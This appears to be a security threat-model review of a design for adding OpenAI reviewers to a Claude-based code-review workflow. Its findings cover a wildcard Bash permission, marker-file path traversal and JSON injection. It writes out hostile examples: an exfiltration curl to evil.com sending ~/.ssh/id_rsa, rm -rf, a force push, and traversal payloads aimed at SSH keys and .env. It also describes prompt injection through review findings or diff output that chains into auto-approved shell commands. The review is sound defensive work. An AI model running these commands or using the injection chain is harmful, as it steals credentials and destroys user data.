# Threat Modeler Review — multi-llm-reviewers
**Reviewer:** threat-modeler
**Round:** 1 (cold review)
**Iteration:** 1
**Verdict:** needs_revision

---

## Review method

For every flow in the master plan I asked: "What does this design ASSUME that an attacker
(or a compromised dependency, or a malicious commit) can violate?"

I read:
- `specs/multi-llm-reviewers/README.md` (master plan)
- `specs/multi-llm-reviewers/spec_audit.md`
- `skills/feature-development/ai_review_json.sh` (the Gemini pattern being mirrored)
- `hooks/enforce_skill_invoked.py` (enforcement model)
- `skills/feature-development/review_schema.json`
- `~/.claude/settings.json` (permissions model)
- `specs/.tlmforge_active_feature` (live marker file)

---

## Findings

### CRITICAL-1 — `Bash(OPENAI_API_KEY=:*)` auto-approves arbitrary shell commands

**Violated assumption:** The design assumes the `Bash(OPENAI_API_KEY=:*)` settings.json
permission entry only permits legitimate review invocations that happen to set the key as
a prefix. The design treats this as equivalent to the existing `Bash(GEMINI_API_KEY=:*)`.

**Threat scenario:** The `Bash(OPENAI_API_KEY=:*)` pattern in `settings.json` is a prefix
match on the full Bash command string — it auto-approves *any* Bash command whose text
begins with `OPENAI_API_KEY=`. This means:

```
OPENAI_API_KEY=x rm -rf ~/important_dir
OPENAI_API_KEY=x curl http://evil.com/exfil -d @~/.ssh/id_rsa
OPENAI_API_KEY=x git push --force origin main
```

All of these are auto-approved without a user confirmation prompt, because Claude's
permission system matches on prefix. An attacker who can inject a tool call (via prompt
injection in a review finding, via a compromised MCP server, or via a malicious
`git diff HEAD` output that escapes into Claude's context) can chain this to run
arbitrary destructive shell commands without the user seeing an approval prompt.

The existing `Bash(GEMINI_API_KEY=:*)` carries the same risk, but adding a second
identically-scoped entry doubles the attack surface. More importantly, this design is
the right moment to correct the pattern for both.

**Impact:** Arbitrary shell execution under the user's account with no approval gate,
exploitable by any prompt injection vector that reaches Claude's tool-call output.

**Suggested fix:** Do not use the prefix-wildcard pattern for key injection. Instead,
use a narrow permission scoped to the exact invocation shape:
```
"Bash(ai_review_openai.sh:*)"
"Bash(ai_review_json_openai.py:*)"
```
The key itself is passed as an env prefix in the SKILL.md orchestration one-liner, which
Claude generates dynamically — that one-liner should be approved on first use (auto-mode
prompt), not pre-approved via a wildcard. If a blanket env-prefix pattern must be kept
for workflow convenience, scope it to the working directory:
`"Bash(OPENAI_API_KEY=* skills/feature-development/:*)"`.

---

### CRITICAL-2 — `specs/.tlmforge_active_feature` is an unvalidated redirect for plan-mode file reads

**Violated assumption:** The design assumes the content of `specs/.tlmforge_active_feature`
is a simple feature directory name written by the SKILL.md orchestration. The design does
NOT validate or sanitize the file's content before using it in a path construction that
determines what file gets sent to OpenAI.

**Threat scenario:** The plan specifies (README.md line 144):
```
mode=plan: reads `specs/$(cat specs/.tlmforge_active_feature)/README.md` and sends it
```

This is a shell subshell expansion with unquoted/unvalidated content. If a malicious
commit (or a compromised dependency running in the repo context, or an attacker with
write access to the working tree) writes a path-traversal payload to
`specs/.tlmforge_active_feature`, the script will open an arbitrary file and send its
contents to OpenAI's API. Example:

```
../../../.ssh/id_rsa
../../.env
../../.git/config
../agent-hardening/README.md  # leaks another feature's unreleased design
```

The content of the referenced file then gets embedded in the prompt to `gpt-5.5` and
sent over HTTPS to `api.openai.com`. This is a sensitive-file exfiltration path: the
marker file controls which file gets exfiltrated.

**Impact:** Arbitrary local file read + exfiltration to a third-party API endpoint
(`api.openai.com`), exploitable by any actor who can write `specs/.tlmforge_active_feature`.

**Suggested fix:** Before constructing the path, validate the marker content is a
simple directory name with no path separators or special characters. In Python:
```python
import re
feature = open("specs/.tlmforge_active_feature").read().strip()
if not re.fullmatch(r'[a-zA-Z0-9_-]+', feature):
    sys.exit(2)  # invalid marker, graceful skip
path = f"specs/{feature}/README.md"
```
In shell: `[[ "$feature" =~ ^[a-zA-Z0-9_-]+$ ]] || exit 2`.
This blocks `..`, `/`, spaces, and shell metacharacters.

---

### HIGH-1 — Code diffs sent to OpenAI contain the full working-tree change surface

**Violated assumption:** The design assumes `git diff HEAD` produces a diff of
"the feature being reviewed." It does not assume, or constrain, what that diff
may contain.

**Threat scenario:** `git diff HEAD` produces the full uncommitted working-tree
delta. In practice this can include:

- Accidentally staged `.env` files (common developer mistake)
- Credential rotation commits that briefly contain old+new key values in a diff hunk
- Private business logic, unreleased feature designs embedded in comments
- PII in test fixtures (names, emails, phone numbers in seed data)
- Internal system architecture details in comments that are NDA-sensitive

All of this is sent as plaintext in the prompt body to `api.openai.com`. OpenAI's
data handling policy for API traffic (zero-day data retention on the API tier) is a
design-level trust assumption the user is making. There is currently no filtering,
scrubbing, or allowlist of what diff content is permissible to send.

**Impact:** Inadvertent exfiltration of secrets, PII, or sensitive internal design
to a third-party LLM API. Not exploitable by an external attacker — but a compliance
risk and a trust-boundary crossing the design does not explicitly acknowledge as
accepted.

**Suggested fix:** The design should explicitly document this as an accepted risk in
the risk audit table (with "DATA SENT TO OPENAI" as a named risk). Additionally,
add a lightweight pre-flight scan of the diff for common secret patterns (e.g.,
`OPENAI_API_KEY=`, `-----BEGIN RSA`, `password=`) and abort with a warning rather
than send. This is defense-in-depth, not a complete fix.

---

### HIGH-2 — OpenAI API error messages interpolated into shell JSON string — injection if error contains quotes or backslashes

**Violated assumption:** The design assumes the error-reporting path (mirroring `write_error`
from the Gemini script) safely embeds error message strings into JSON. The Gemini script
uses hardcoded string literals in `write_error`. The OpenAI script will use API error
message text from the SDK exception — which is third-party-controlled content.

**Threat scenario:** The Gemini script's `write_error` builds JSON via shell string
interpolation (line 54 of `ai_review_json.sh`):
```bash
atomic_write "...\"finding\":\"${finding}\",\"suggested_fix\":\"${fix}\"..."
```

When the OpenAI script mirrors this pattern and populates `finding` or `fix` from an
`openai.APIError` exception message (e.g., `"Model \"gpt-5.5\" not found"`), the
embedded quote character breaks the JSON string boundary. Result: the written JSON
is malformed, `check_convergence.py` sees an unparseable file, and injects a
`reviewer_json_missing` synthetic CRITICAL — blocking the convergence loop.

This is not a code-execution risk, but it is a reliable denial-of-service on the
convergence engine for any model-not-found or quota-exceeded error whose message
contains quotes or backslashes.

**Impact:** Convergence loop is permanently blocked on `status=error` path for any
OpenAI error with special characters in its message. The feature degrades from
"error surfaced as synthetic CRITICAL" to "unparseable JSON + convergence blocked."

**Suggested fix:** The Python script must NOT mirror the shell string-interpolation
pattern for error JSON. Use `json.dumps()` to construct all JSON output:
```python
import json
payload = {"reviewer": "openai", ..., "findings": [{"finding": str(e), ...}]}
with open(output_path, "w") as f:
    json.dump(payload, f)
```
The Gemini shell script's `write_error` is acceptable because its message strings are
hardcoded literals. The OpenAI Python script has dynamic third-party error strings;
it must use a JSON serializer.

---

### MEDIUM-1 — Plan-mode sends the entire README.md to OpenAI with no size limit or content filter

**Violated assumption:** The design assumes the README.md being sent is a bounded,
well-behaved document. It does not constrain the file size or content.

**Threat scenario:** A README.md that contains embedded secret material (e.g., a
developer accidentally includes a key in a code block during drafting), or that is
abnormally large (50K+ tokens from a verbose spec), is sent verbatim to OpenAI. The
first case is a confidentiality risk; the second is a cost risk (50K input tokens at
gpt-5.5 rates = significant unexpected charge per review invocation).

Additionally, the README.md path is under `specs/<feature>/README.md` — the same
directory hierarchy where the `spec_audit.md` and `agent_verification/` files live.
If a future design variant sends `spec_audit.md` instead, it could include prior
vulnerability findings in the review body sent to OpenAI.

**Suggested fix:** Add a max-size guard before sending (e.g., refuse to send files
larger than 100KB, write `status=error`). Document in SKILL.md that plan-mode input
content is sent to the configured external LLM.

---

### MEDIUM-2 — `TLMFORGE_OPENAI_MODEL` env var is passed to the SDK without validation

**Violated assumption:** The design assumes `TLMFORGE_OPENAI_MODEL` contains a valid
model identifier string. The plan notes that a non-existent model name produces an API
error that is surfaced as a synthetic CRITICAL — this is the correct behavior. However
the design does not address what happens if the model name contains characters that are
meaningful to the SDK or the API.

**Threat scenario:** The env var is passed directly to
`client.chat.completions.create(model=model, ...)`. An attacker who can set this env
var to a value like `gpt-4\nX-Injected-Header: evil` is relying on the SDK to
sanitize the value before using it in the HTTP request. The OpenAI Python SDK does
pass model as a JSON field in the POST body (not as a URL component or header), so
JSON serialization by the SDK will handle embedded newlines without leakage. This
is medium rather than critical because the SDK provides implicit sanitization.

The path-traversal concern (model name used in a URL path) is real but mitigated by
the SDK abstraction. Worth documenting as a decided-safe assumption.

**Suggested fix:** Add a simple allowlist pattern check:
`if not re.fullmatch(r'[a-zA-Z0-9._-]+', model): raise ValueError(f"Invalid model name: {model}")`.
This eliminates the assumption entirely and avoids relying on SDK internals for safety.

---

### LOW-1 — TOCTOU between `OPENAI_API_KEY` presence check and use

**Violated assumption:** The design checks `OPENAI_API_KEY` in the shell wrapper (to
decide whether to skip), then passes it to the Python script which reads it again
from env. Between the check and the Python script's actual API call, the env var
could have been unset by a concurrent process (extremely unlikely in local dev, but
possible in a CI environment where env vars are scoped per-command).

**Impact:** The Python script would fail with an `AuthenticationError` from the SDK
rather than a graceful exit 2. This would write a `status=error` JSON (which is the
correct fallback behavior per the plan), so the impact is cosmetic — a "key missing"
error looks like an API error in the sidecar. Low severity because the convergence
engine handles both identically.

**Suggested fix:** The Python script should have its own presence check at the top
(before the API call) so it catches missing-key gracefully with exit 2 regardless of
whether the shell wrapper already checked. The plan already states the Python script
does this pre-flight check — confirm implementation matches the design.

---

### LOW-2 — The `--output` path is not validated for traversal before the atomic write

**Violated assumption:** The design assumes the `--output` path is always a path inside
the feature's `agent_verification/` directory, constructed by the SKILL.md orchestration.
The script itself does not enforce this.

**Threat scenario:** The shell script accepts `--output /etc/passwd` or
`--output /home/user/.ssh/authorized_keys` and would write to those paths (subject to
OS permissions). In practice, the path is always generated by the orchestrating agent
from a template, so this requires the orchestrating agent itself to be compromised (e.g.,
via prompt injection in a prior review finding that reshapes the next tool call).

**Impact:** Arbitrary file overwrite at OS-permission level, gated by a compromised
orchestrator. Chained with CRITICAL-1 (prompt injection via `OPENAI_API_KEY=:*`), this
is a credible attack path.

**Suggested fix:** Validate that `--output` resolves to within the current working tree:
```python
import pathlib
output = pathlib.Path(args.output).resolve()
cwd = pathlib.Path.cwd().resolve()
if not str(output).startswith(str(cwd)):
    sys.exit(64)
```

---

## Summary of trust-boundary violations

| # | Severity | Assumption violated | Attacker capability needed |
|---|----------|--------------------|-----------------------------|
| C-1 | CRITICAL | `OPENAI_API_KEY=:*` only covers legitimate key-passing | Prompt injection in any review finding |
| C-2 | CRITICAL | `.tlmforge_active_feature` contains a safe directory name | Write access to working tree (git commit, dev mistake) |
| H-1 | HIGH | `git diff HEAD` contains only safe, non-sensitive content | Accidental (no attacker needed) |
| H-2 | HIGH | OpenAI error messages are safe to interpolate into JSON strings | Any model-not-found / quota-exceeded API error |
| M-1 | MEDIUM | README.md is bounded and non-sensitive | Accidental (verbose spec or key in code block) |
| M-2 | MEDIUM | `TLMFORGE_OPENAI_MODEL` is a valid model identifier | Env var manipulation |
| L-1 | LOW | Key presence at check time = key presence at use time | CI race (TOCTOU) |
| L-2 | LOW | `--output` path is always within the working tree | Compromised orchestrator |

---

## Verdict: needs_revision

Two criticals block convergence:

**CRITICAL-1** must be resolved at design time — the permission entry shape needs to
change before implementation writes `settings.json`. The `Bash(OPENAI_API_KEY=:*)` wildcard
is a standing privilege-escalation surface the design explicitly adds. This is the wrong
time to add it.

**CRITICAL-2** must be resolved at design time — the path construction from
`.tlmforge_active_feature` without validation must be specified with a validation step
before any code is written. Once the Python implementation is done without validation,
future reviewers will not have a design requirement to point to.

HIGH-2 is the highest-priority implementation-time concern: confirm the Python script
uses `json.dumps()` for ALL output, never shell string interpolation for error messages.
